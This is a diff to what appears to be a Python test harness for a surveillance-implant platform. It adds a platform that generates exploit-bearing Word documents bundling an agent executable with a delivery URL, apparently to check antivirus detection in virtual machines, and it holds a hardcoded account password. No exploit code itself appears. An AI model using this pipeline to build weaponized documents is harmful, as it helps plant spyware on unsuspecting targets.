@@ -98,13 +98,13 @@ class connection:
     passwd = "avmonitorp123"
 
     def __enter__(self):
-        print "DBG login %s@%s" % (self.user, self.host)
+        #print "DBG login %s@%s" % (self.user, self.host)
         self.conn = Rcs_client(self.host, self.user, self.passwd)
         self.conn.login()
         return self.conn
 
     def __exit__(self, type, value, traceback):
-        print "DBG logout"
+        #print "DBG logout"
         self.conn.logout()
 
 class VMAVTest:
@@ -201,9 +201,16 @@ class VMAVTest:
 
             params['exploit'] = {"generate": 
                 {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2012-001", 
-                "melt":{"demo":False, "scout":True, "admin":False}}, "platform":"exploit", 
+                "melt":{"demo":False, "scout":True, "admin":False}}, "platform":"exploit", "deliver": {"user":"USERID"},
                 "melt":{"combo":"txt", "filename":"example.txt", "appname":"agent.exe", 
                 "input":"000"}, "factory":{"_id":"000"}
+            }
+
+            params['exploit_doc'] = {"generate": 
+                    {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2013-002", 
+                    "melt":{"demo":False, "scout":True, "admin":False}}, 
+                "platform":"exploit", "deliver": {"user":"USERID"},
+                "melt":{"filename":"example.doc", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
             }
 
             param = params[self.platform]
@@ -216,6 +223,10 @@ class VMAVTest:
 
                 if melt:
                     print "- Melt build with: ", melt
+                    appname = "exp_%s" % self.hostname
+                    param['melt']['appname'] = appname
+                    param['melt']['url'] = "http://%s/%s" % (c.host, appname)
+                    param['deliver']['user'] = c.myid
                     r = c.build_melt(factory, param, melt, filename)
                 else:
                     print "- Silent build"
@@ -432,7 +443,9 @@ class VMAVTest:
 
         meltfile = None
         if self.kind == 'melt':
-            if self.platform == 'exploit':
+            if self.platform == 'exploit_doc':
+                meltfile = 'assets/meltexploit.doc'
+            elif self.platform == 'exploit':
                 meltfile = 'assets/meltexploit.txt'
             else:
                 meltfile = 'assets/meltapp.exe'
@@ -484,7 +497,7 @@ def pull(args):
     """ starts a scout """
     if args.platform == "all":
         for platform in args.platform_type.keys():
-            if platform == "exploit":
+            if platform.startswith("exploit"):
                 continue
             print "pulling platform ", platform
             try:
@@ -514,7 +527,7 @@ def clean(args):
     vmavtest._delete_targets(operation)
    
 def main():
-    platform_desktop = [ 'windows', 'linux', 'osx', 'exploit' ]
+    platform_desktop = [ 'windows', 'linux', 'osx', 'exploit', 'exploit_doc' ]
     platform_mobile =  [ 'android', 'blackberry', 'ios' ]
 
     platform_type = {}
